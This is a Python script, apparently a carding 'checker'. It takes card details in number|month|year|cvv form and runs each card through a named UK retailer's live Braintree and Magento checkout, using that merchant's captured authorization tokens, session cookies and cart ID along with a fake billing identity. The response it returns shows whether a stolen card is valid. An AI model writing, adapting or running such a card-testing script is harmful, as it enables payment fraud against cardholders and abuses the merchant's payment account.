import requests
import user_agent
import uuid
def Tele(ccx):
		ccx=ccx.strip()
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = ccx.split("|")[2]
		cvc = ccx.split("|")[3]
		bin=n[:6]
	
		user = str(user_agent.generate_user_agent)
		sess = str(uuid.uuid4())
	
		
		headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg3MzU0MjQsImp0aSI6IjFjNTM4NTU1LTgyZjctNGJhMy1iM2RlLWZiMTM1NGVkYWQ3MiIsInN1YiI6IjQ0YnhydG0zcmRnbW5ocGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ0YnhydG0zcmRnbW5ocGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.lFVD0ipwQWwSRd8s7mdTV-hQlEVS7lXvjlrEjVmnmPFN7I15DYDMNoONgST3sdZWGPL8egcra73epZC6wHcAyg',
		    'braintree-version': '2018-05-10',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
		    'referer': 'https://assets.braintreegateway.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': user,
		}
		
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': sess,
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': mm,
		                'expirationYear': yy,
		                'cvv': cvc,
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
		
		token = (response.json()['data']['tokenizeCreditCard']['token'])
		idd = (response.json()['extensions']['requestId'])
		
		headers = {
		    'authority': 'api.braintreegateway.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/json',
		    'origin': 'https://www.jamessmithfencing.co.uk',
		    'referer': 'https://www.jamessmithfencing.co.uk/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': user,
		}
		
		json_data = {
		    'amount': '0.85',
		    'additionalInfo': {
		        'billingLine1': 'New YURK',
		        'billingCity': 'New YURK',
		        'billingState': 'NY',
		        'billingPostalCode': '10001',
		        'billingCountryCode': 'US',
		        'billingPhoneNumber': '16462965794',
		        'billingGivenName': '\\u0041\\u006e\\u0067\\u0065\\u006c',
		        'billingSurname': '\\u0052\\u0069\\u0070\\u0070\\u0069\\u006e',
		    },
		    'challengeRequested': True,
		    'bin': bin,
		    'dfReferenceId': '0_7690e871-2825-41b7-819b-935b8042b563',
		    'clientMetadata': {
		        'requestedThreeDSecureVersion': '2',
		        'sdkVersion': 'web/3.94.0',
		        'cardinalDeviceDataCollectionTimeElapsed': 10,
		        'issuerDeviceDataCollectionTimeElapsed': 8349,
		        'issuerDeviceDataCollectionResult': True,
		    },
		    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTg3MzU0MjQsImp0aSI6IjFjNTM4NTU1LTgyZjctNGJhMy1iM2RlLWZiMTM1NGVkYWQ3MiIsInN1YiI6IjQ0YnhydG0zcmRnbW5ocGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ0YnhydG0zcmRnbW5ocGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.lFVD0ipwQWwSRd8s7mdTV-hQlEVS7lXvjlrEjVmnmPFN7I15DYDMNoONgST3sdZWGPL8egcra73epZC6wHcAyg',
		    'braintreeLibraryVersion': 'braintree/web/3.94.0',
		    '_meta': {
		        'merchantAppId': 'www.jamessmithfencing.co.uk',
		        'platform': 'web',
		        'sdkVersion': '3.94.0',
		        'source': 'client',
		        'integration': 'custom',
		        'integrationType': 'custom',
		        'sessionId': idd,
		    },
		}
		
		response = requests.post(
		    f'https://api.braintreegateway.com/merchants/44bxrtm3rdgmnhpf/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
		    headers=headers,
		    json=json_data,
		)
		
		three = str(response.json()['paymentMethod']['threeDSecureInfo']['dsTransactionId'])
		nonse = (response.json()['paymentMethod']['nonce'])
		
		
		cookies = {
		    'cf_clearance': 'FORfDqb02_rgfru7P4zyQCe1LPy8i4dMF3Nycph2Pr8-1718648930-1.0.1.1-5qmac3GaF50TN8thVSEPV7uaAqCSsSXwSGiitBgCRCYE8gXwo6JdQhO0wQ0ZDU1ei9RLZsXrucwxJwmUfK1m8A',
		    'form_key': 'GzCYSxNnfX5Gb8lh',
		    'mage-cache-storage': '{}',
		    'mage-cache-storage-section-invalidation': '{}',
		    'mage-cache-sessid': 'true',
		    'csrf_token': three,
		    'form_key': 'GzCYSxNnfX5Gb8lh',
		    'searchsuiteautocomplete': '{}',
		    'mage-messages': '',
		    'recently_viewed_product': '{}',
		    'product_data_storage': '{}',
		    'recently_viewed_product_previous': '{}',
		    'recently_compared_product': '{}',
		    'recently_compared_product_previous': '{}',
		    '_gid': 'GA1.3.183046755.1718648975',
		    '_ga': 'GA1.1.1602292211.1718648972',
		    'PHPSESSID': 'adgheev3qa6vom08i0boo8nmla',
		    '__kla_id': 'eyJjaWQiOiJOalppT0RrM09UTXRNREV5TWkwME1HTTFMVGsxWVRjdE56WmpaREJqWkRoaFpHUXoiLCIkcmVmZXJyZXIiOnsidHMiOjE3MTg2NDg5MzEsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmphbWVzc21pdGhmZW5jaW5nLmNvLnVrLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxODY0OTAyNywidmFsdWUiOiIiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cuamFtZXNzbWl0aGZlbmNpbmcuY28udWsvIn19',
		    'private_content_version': 'd0a4d60e0a06025bd7049e545bfbbe3a',
		    '_ga_XPVSJB992G': 'GS1.1.1718648972.1.1.1718651491.60.0.416171966',
		    '_gcl_au': '1.1.1494212975.1718648940.1948739221.1718649103.1718651491',
		    'section_data_ids': '{%22cart%22:1718650142%2C%22directory-data%22:1718649002%2C%22quote-list%22:1718650142%2C%22aw-consent%22:1718649002%2C%22captcha%22:1718650142}',
		}
		
		headers = {
		    'authority': 'www.jamessmithfencing.co.uk',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/json',
		    'origin': 'https://www.jamessmithfencing.co.uk',
		    'referer': 'https://www.jamessmithfencing.co.uk/checkout/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': user,
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		json_data = {
		    'cartId': '8zuw3TfJEAEVCzKJ4NSFg1CPbvQg2yxU',
		    'billingAddress': {
		        'countryId': 'US',
		        'regionId': '43',
		        'regionCode': 'NY',
		        'region': 'New York',
		        'street': [
		            'New YURK',
		        ],
		        'company': '',
		        'telephone': '16462965794',
		        'postcode': '10001',
		        'city': 'New YURK',
		        'firstname': 'Angel',
		        'lastname': 'Rippin',
		        'vatId': '19174195208',
		        'saveInAddressBook': 1,
		        'customAttributes': [],
		        'country_id': 'US',
		        'region_id': '43',
		        'save_in_address_book': 0,
		    },
		    'paymentMethod': {
		        'method': 'braintree',
		        'additional_data': {
		            'payment_method_nonce': nonse,
		            'device_data': '{"correlation_id":"59bb550d0147381e12236ea7e959e61e"}',
		        },
		    },
		    'email': 'gvvvv7277@gmail.com',
		}
		
		response = requests.post(
		    'https://www.jamessmithfencing.co.uk/rest/en/V1/guest-carts/8zuw3TfJEAEVCzKJ4NSFg1CPbvQg2yxU/payment-information',
		    cookies=cookies,
		    headers=headers,
		    json=json_data,
		)

		try:
			ii=(response.text)
		except:
			return 'error'
		return ii

